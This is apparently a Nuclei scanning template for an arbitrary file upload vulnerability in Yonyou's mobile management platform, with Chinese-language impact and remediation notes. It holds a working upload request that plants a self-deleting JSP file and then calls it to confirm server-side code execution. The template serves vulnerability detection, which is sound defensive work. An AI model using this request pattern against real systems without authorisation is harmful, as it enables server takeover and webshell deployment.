id: yonyou-mobile-uploadapk-fileupload
info:
  name: 用友 移动系统管理平台 uploadapk 接口 - 任意文件上传漏洞
  author: chaitin
  severity: high
  description: |
    该模板用于检测 用友 移动系统管理平台 uploadapk 接口 - 任意文件上传漏洞。该类漏洞通常源于上传接口缺少认证、文件类型校验、存储隔离或执行权限控制。模板会向 `/maportal/appmanager/uploadApk.do?pk_obj=`、`/maupload/apk/{{rfilename}}.jsp` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能上传脚本、WebShell 或恶意文件，并借此执行代码或长期控制服务器。
    - 上传目录若可被访问或解析，可能导致数据篡改、恶意内容投递和业务系统被接管。
  remediation: |
    - 为上传接口增加认证授权和 CSRF 防护，限制可上传文件类型、大小和扩展名。
    - 在服务端校验文件内容与 MIME 类型，将上传文件存储到不可执行目录并使用随机文件名。
    - 清理异常上传文件，复核上传目录解析配置、访问日志和可疑账号活动。
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/用友OA/用友%20移动管理系统%20uploadApk.do%20任意文件上传漏洞.md
  metadata:
    verified: true
    max-request: 2
    vendor: yonyou
    product: mobile
  tags: fileupload,vuln,yonyou
variables:
  rfilename: '{{to_lower(rand_text_alpha(4))}}'
  s1: '{{rand_int(40000, 44800)}}'
  s2: '{{rand_int(40000, 44800)}}'
  rboundary: '{{to_lower(rand_text_alpha(8))}}'
flow: http(1) && http(2)
http:
  - method: POST
    path:
      - '{{BaseURL}}/maportal/appmanager/uploadApk.do?pk_obj='
    redirects: false
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
    body: |
      ------WebKitFormBoundary{{rboundary}}
      Content-Disposition: form-data; name="downloadpath"; filename="{{rfilename}}.jsp"
      Content-Type: application/msword

      <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
      ------WebKitFormBoundary{{rboundary}}--
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, ''"status":2'')'
  - method: GET
    path:
      - '{{BaseURL}}/maupload/apk/{{rfilename}}.jsp'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, to_string(s1 * s2))'
